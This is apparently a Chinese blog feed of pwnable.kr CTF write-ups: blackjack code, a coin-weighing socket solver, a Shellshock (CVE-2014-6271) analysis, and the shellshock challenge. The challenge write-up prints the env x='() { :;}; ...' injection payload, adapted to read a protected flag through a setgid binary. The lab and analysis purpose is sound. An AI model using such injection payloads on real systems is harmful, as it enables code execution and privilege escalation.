class="line">    &#123; </span><br><span class="line">            system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">            play();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">&#x27;N&#x27;</span>) || (choice1 == <span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        fileresults();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nBYE!!!!\n\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span> <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fpresults; <span class="comment">//File pointer is fpresults</span></span><br><span class="line">    fpresults = fopen(RESULTS, <span class="string">&quot;w&quot;</span>); <span class="comment">//Creates file and writes into it</span></span><br><span class="line">    <span class="keyword">if</span>(fpresults == <span class="literal">NULL</span>) <span class="comment">// what to do if file missing from directory</span></span><br><span class="line">    &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;\nError: File Missing\n&quot;</span>);</span><br><span class="line">               system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;     </span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\n\t RESULTS&quot;</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\n\t---------\n&quot;</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\nYou Have Won %d Times\n&quot;</span>, won);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\nYou Have Lost %d Times\n&quot;</span>, loss);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">&quot;\nKeep Playing and Set an All-Time Record!&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">     fclose(fpresults);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目是一个游戏blackjack(我们叫做21点)，获取flag条件就是赢成百万富翁&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210917165031.</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之11-coin1</title>
    <link href="http://example.com/2021/09/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9711-coin1/"/>
    <id>http://example.com/2021/09/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9711-coin1/</id>
    <published>2021-09-14T16:00:00.000Z</published>
    <updated>2021-09-15T11:53:50.106Z</updated>
    
    <content type="html"><![CDATA[<p> 本道提示让我们通过nc命令链接，所以直接连上去看看：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210915100528.png"></p><p>  题目大概意思是：现在手里拿着一些金币，其中一个是假币，假币和真币外观一摸一样，但是重量不同，真币重10假币重9，然后我们找到100枚假币才会得到flag。我们会获得一些硬币(N)，然后设定规则对某一组硬币称重，在有限的C次机会内找到假币。最终需要在60s内完成游戏100次，即找到100枚假币来完成游戏。</p><p><strong>分析：</strong></p><p>题目是一个和漏洞关系不大的coding题目,主要是二分法查找，还是做一下吧，这里记得先随便用个之前的题目ssh登录到服务器在解题比较好，因为这玩意儿要完成100次，网速不稳定就会在中间某次请求超时失败，所以登录服务器本地做题。比如使用前面的inpu2题目登录，在/tmp/下新建coin目录(得新建目录才可以)，然后再coin/下写代码并执行即可。</p><p>写好的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=socket.socket()</span><br><span class="line"><span class="comment">#s.connect((&quot;pwnable.kr&quot;,9007))</span></span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9007</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetNumbers</span>(<span class="params">begin,end</span>):</span></span><br><span class="line">numList=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(begin,end):</span><br><span class="line">numList.append(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="comment">#print &quot; &quot;.join(numList)</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(numList)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StartGame</span>(<span class="params">num,count</span>):</span></span><br><span class="line">fr=(<span class="number">0</span>,num/<span class="number">2</span>)</span><br><span class="line">sr=(num/<span class="number">2</span>,num)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count+<span class="number">1</span>):</span><br><span class="line">s.send(GetNumbers(fr[<span class="number">0</span>],fr[<span class="number">1</span>])+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line"><span class="keyword">if</span>(re.match(<span class="string">r&quot;^\d+$&quot;</span>,<span class="built_in">str</span>(data))):</span><br><span class="line">weigh=<span class="built_in">int</span>(data)</span><br><span class="line"><span class="keyword">if</span>(weigh%<span class="number">10</span>==<span class="number">0</span>):</span><br><span class="line">fr=(sr[<span class="number">0</span>],(sr[<span class="number">0</span>]+sr[<span class="number">1</span>])/<span class="number">2</span>+(sr[<span class="number">0</span>]+sr[<span class="number">1</span>])%<span class="number">2</span>)</span><br><span class="line">sr=(fr[<span class="number">1</span>],sr[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">fr=(fr[<span class="number">0</span>],(fr[<span class="number">0</span>]+fr[<span class="number">1</span>])/<span class="number">2</span>+(fr[<span class="number">0</span>]+fr[<span class="number">1</span>])%<span class="number">2</span>)</span><br><span class="line">sr=(fr[<span class="number">1</span>],sr[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="built_in">print</span> s.recv(<span class="number">1024</span>*<span class="number">2</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span>(re.match(<span class="string">r&quot;^N=(\d+) C=(\d+)$&quot;</span>,<span class="built_in">str</span>(data))):</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line">num=<span class="built_in">int</span>(data.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">count=<span class="built_in">int</span>(data.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">StartGame(num,count)</span><br><span class="line"><span class="keyword">elif</span>(re.match(<span class="string">r&quot;^Correct!$&quot;</span>,<span class="built_in">str</span>(data))):</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span>(<span class="string">&quot;format error&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(data) <span class="keyword">or</span> <span class="string">&quot;time expired! bye!&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(data)):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[Server] &quot;</span>+data</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>执行后，成功得到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210915194900.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 本道提示让我们通过nc命令链接，所以直接连上去看看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210915100528.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;  </summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>shellsock漏洞(CVE-2014-6271)分析</title>
    <link href="http://example.com/2021/09/13/%E6%BC%8F%E6%B4%9E/shellsock%E6%BC%8F%E6%B4%9E(CVE-2014-6271)/"/>
    <id>http://example.com/2021/09/13/%E6%BC%8F%E6%B4%9E/shellsock%E6%BC%8F%E6%B4%9E(CVE-2014-6271)/</id>
    <published>2021-09-12T16:00:00.000Z</published>
    <updated>2021-11-19T10:11:48.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>​    在刷pwnable.kr的题目shellshock时，碰到了这个bash的老漏洞，这里我也对其分析一下，做个记录。</p><p>​    shellshock破壳漏洞，是一个高危的漏。漏洞原理简单来说就是子进程bash在获得父bash进程传递的shell环境变量时，对函数定义的变量解析除了问题，导致了任意代码被执行。</p><p>​    该漏洞可以分为本地利用和远程利用两种，其远程利用危害性极强，攻击者可以利用该漏洞精心伪造数据，通过网络请求到一台利用bash脚本来处理用户请求的网站上，来直接或间接的触发一个bash脚本，这样就可以远程执行而已代码了。</p><p>​    经测试，从bash1.14 到4.3都存在这样的漏洞。   </p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>​    我是在ubuntu中玩耍的，先确定自己bash版本，新的ubuntu自带的bash版本都是4.3以上的，不存在shellshock漏洞，所以需要自己手动安装低版本的bash：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210913105601.png"></p><p>​     从<a href="https://www.gnu.org/software/bash/bash.html">gun.org/software/bash</a>选择一个国内的镜像源，然后把bash-4.1下载并进行安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/gnu/bash//bash-4.1.tar.gz</span><br><span class="line">tar -zxvf bash-4.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bash-4.1/</span><br><span class="line">sudo ./configure --prefix=/usr/<span class="built_in">local</span>/bash-4.1 <span class="comment">#这里如果时新环境，先装好gcc，sudo apt install gcc</span></span><br><span class="line">sudo make  make install</span><br></pre></td></tr></table></figure><p>​    执行上述步骤后，在/usr/local/bash-4.1/下成功安装到新的bash，可以验证查看一下，成功安装到了指定版本的bash：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210910171905.png"></p><p>​    为了省事，这里就不再弄PATH变量等操作了，直接在bin/下使用新安装的bash进行漏洞测试即可。</p><p>​    针对这个shellshock漏洞，一个广为流传的本地测试poc命令如下，我们稍作修改，然后测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">env x=<span class="string">&#x27;() &#123; :;&#125;; echo vulnerable&#x27;</span> bash -c <span class="string">&quot;echo this is a test&quot;</span></span><br><span class="line"><span class="comment">#这里针对性修改一下，来做测试，在usr/local/bash-4.1/bin下执行poc</span></span><br><span class="line">env x=<span class="string">&#x27;() &#123; :;&#125;; echo vulnerable&#x27;</span> ./bash -c <span class="string">&quot;echo this is a test&quot;</span></span><br></pre></td></tr></table></figure><p>​    成功输出vulnerable，漏洞复成功：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210910174405.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>​    首先需要了解一下shell中的变量类型和变量的作用域以及bash父子进程对于shell变量的使用，shell变量以及其对应的作用域可以分为如下三种：</p><ul><li>局部变量(local var)：只能在函数内部使用</li><li>全局变量(global var)：在<strong>当前shell进程</strong>中可以使用</li><li>环境变量(env var)：可以让当前shell进程的子进程使用</li></ul><p>​    对于这三种变量依次分析一下，局部变量没什么好说的，主要是全局变量和环境变量这里简单说明一下。全局变量只在当前shell程序中有效，对于其它shell进程和子进程都无效，比如下面，定义一个变量a=910，在当前bash shell中可以输出，但是新开一个bash子进程就访问不到。</p><p>​    创建全局变量的shell进程称为父进程(这里用bash)，父进程中新创建的进程就为子进程，要想子进程也访问到父bash进程的全局变量，那么就需要用<code>export</code>将全局变量导出，被导出的变量就被称为<strong>环境变量</strong>。当shell产生子进程时，它会继承父进程的环境变量为自己所用(<strong>自动加载</strong>)，也就是说父进程的环境变量传递给了子进程，当然环境变量还可以继续向下传递给孙进程。</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshockimage-20210913185624618.png"></p><p>​    bash中可以将shell函数也导出为环境变量，这有两种方式：1.直接定义函数并export -f（-f为参数，必须设置）；2.通过环境变量值来定义函数</p><ol><li>直接定义函数并导出比较好理解，用法如下：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210913191107.png"></p><ol start="2"><li><p>而shellshock漏洞利用的正好是第二种方法，通过bash对环境变量值的转换来获得。bash中，当某个环境变量的值为字符串且以<code>&quot;() &#123;&quot;</code>的格式开头(小括号和大括号间必有空格)书写时，那么该环境变量在被子bash进程加载时会被转换为一个shell函数，而不是当作一个shell变量，示例如下：</p><p><strong>注：</strong>上述通过环境变量来定义函数的方式，被称为bash的自动导入机制(自动导入函数到当前bash的子进程)，应为出现了shellshock漏洞，所以现在发行版的linux都会默认关了bash的自动导入机制，想要测试该机制还得用刚才配置的bash低版本来测试。</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshockimage-20210914111044982.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914111013.png"></p><p>​    Shellshock漏洞就是出现在bash的自动导入机制中，如果在<code>() &#123;&#125;</code>完整函数变量尾部的花括号后加上一个“小尾巴”(shell 命令)，由于bash中解析逻辑存在漏洞它会在转换过程中，把”小尾巴“的内容也进行执行:<br><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914150218.png"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>​    总结一下，shellshock漏洞主要出现在，子bash进程导入父bash进程的环境变量时，对函数型环境变量的值解析出了问题，导致额外的代码被执行。</p><p>​    该漏洞存在于bash源代码的variables.c文件中，拿上面bash4.1的对应文件进行分析，包含漏洞的代码在<code>initialize_shell_variables()</code>函数中：</p><ol><li>首先进入函数，第一步主要操作就是遍历整个env列表，对每一个有效环境变量进行操作，解析完成后，name-存储环境变量名，string-存储环境变量值，char_index-存储环境变量名长度：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914160711.png"></p><ol start="2"><li>判断有效的环境变量是否匹配<code>&#39;() &#123;&#39;</code>也就是是否为导出函数(另外两个判关于特权模式的判断，需要保证real uid和effective id相同，一般情况下都是相同的)，若是自动导出函数，就直接申请一块内存空间，然后把string(环境变量值)不做任何拷贝到空间中然后交由<code>parse_and_execute()</code>函数执行</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914161318.png"></p><p>​    <code>parse_and_execute()</code>函数原型如下，传递给函数的所有内容都会被当作普通bash命令执行，所以导致了漏洞的产生。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Parse and execute the commands in STRING.  Returns whatever</span></span><br><span class="line"><span class="comment">   execute_command () returns.  This frees STRING.  FLAGS is a</span></span><br><span class="line"><span class="comment">   flags word; look in common.h for the possible values.  Actions</span></span><br><span class="line"><span class="comment">   are:</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_NONINT) -&gt; interactive = 0;</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_INTERACT) -&gt; interactive = 1;</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_NOHIST) -&gt; call bash_history_disable ()</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_NOFREE) -&gt; don&#x27;t free STRING when finished</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_RESETLINE) -&gt; reset line_number to 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">parse_and_execute (<span class="built_in">string</span>, from_file, flags)</span><br><span class="line">     <span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *from_file;</span><br><span class="line">     <span class="keyword">int</span> flags;</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;​    在刷pwnable.kr的题目shellshock时，碰到了这个bash的老漏洞，这里我也对其分析一下，做个记录。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="linux漏洞" scheme="http://example.com/tags/linux%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之10-shellshock</title>
    <link href="http://example.com/2021/09/12/pwnable/pwnable.kr%E7%B3%BB%E5%88%9710-shellshock/"/>
    <id>http://example.com/2021/09/12/pwnable/pwnable.kr%E7%B3%BB%E5%88%9710-shellshock/</id>
    <published>2021-09-11T16:00:00.000Z</published>
    <updated>2021-09-14T11:18:18.001Z</updated>
    
    <content type="html"><![CDATA[<p>​    看提示信息是和bash相关：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908164754.png"></p><p>​    ssh链接查看：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908171601.png"></p><p>​    很熟悉的几个文件，把shellshock.c下载查看源码分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setresuid(getegid(), getegid(), getegid());</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    很短的几行代码，这里需要了解一下Linux下进程权限问题，才好理解3、4行代码。</p><p>​    linux下进程权限有这么几个相关的属性：</p><ul><li>ruid/rgid(实际用户id：real userid，real group id)：由启动进程的用户来决定，通常是当前登录用户(即运行可执行文件的用户)</li><li>euid/egid(有效用户：effective userid，effective group id)：一般在进程启动时，直接由ruid/rgid复制而来，或者是当进程对应的可执行文件的set-user-id/set-group-id即那个rwx之外的s标志位)标志位为true时，其为该文件的所属用户/组。euid/egid决定了进程访问文件的权限。</li><li>suid/sgid(保存用户id:saved setuserid、)：从euid/egid复制。</li></ul><p>​    ssh后运行shellshock是以other权限来执行的，执行后setresuid()/setresgid()可以设置上述的几个权限，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">//setresuid, setresgid - set real, effective and saved user or group ID</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setresuid</span><span class="params">(<span class="keyword">uid_t</span> ruid, <span class="keyword">uid_t</span> euid, <span class="keyword">uid_t</span> suid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setresgid</span><span class="params">(<span class="keyword">gid_t</span> rgid, <span class="keyword">gid_t</span> egid, <span class="keyword">gid_t</span> sgid)</span></span>;</span><br></pre></td></tr></table></figure><p>​    程序将所有的这几个权限设置为egid，egid对应的用户组s标志位刚好为true，所以3、4行代码的意思就是把程序shellshock权限提升为shellshock_pwn组权限，用来后面读flag。</p><p>​    程序system并没有对flag进行读取操作，这里就需要费点脑筋了，其实如果对漏洞熟悉的话，看到shellshock这个名字就能想起来那个shellshock破壳漏洞(CVE-2014-6271)，该漏洞的分析可以见我的<a href="http://hskull.cn/2021/09/14/shellsock%E6%BC%8F%E6%B4%9E(CVE-2014-6271)">分析报告</a>。通过该漏洞源码，发现setresuid()/setresgid()其实还有另一种作用，那就是保证ruid和euid相同使得漏洞可以触发。</p><p><strong>做题：</strong></p><ol><li>先验证一下服务器bash版本和漏洞是否存在，测试poc用<code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; /home/shellshock/bash -c &quot;echo this is a test&quot;</code>，system()中用到的bash是存在该漏洞的：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210912204518.png"></p><ol start="2"><li>改造poc，将<code>echo vulnerable</code>改为<code>bash -c cat flag</code>，然后测试，可以成功cat flag，本题完成。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210912205108.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    看提示信息是和bash相关：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908164754.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;​    ssh链接查看：&lt;/p&gt;</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之09-mistake</title>
    <link href="http://example.com/2021/09/08/pwnable/pwnable.kr%E7%B3%BB%E5%88%9709-mistake/"/>
    <id>http://example.com/2021/09/08/pwnable/pwnable.kr%E7%B3%BB%E5%88%9709-mistake/</id>
    <published>2021-09-07T16:00:00.000Z</published>
    <updated>2021-09-12T12:57:02.507Z</updated>
    
    <content type="html"><![CDATA[<p> 从提示信息来看，本题和操作符优先级相关，具体信息如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908095621.png"></p><p>​    照例ssh链接查看源码等信息：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908142915.png"></p><p>​    从服务器把mistake.c下载下来查看漏洞源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">s[i] ^= XORKEY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span 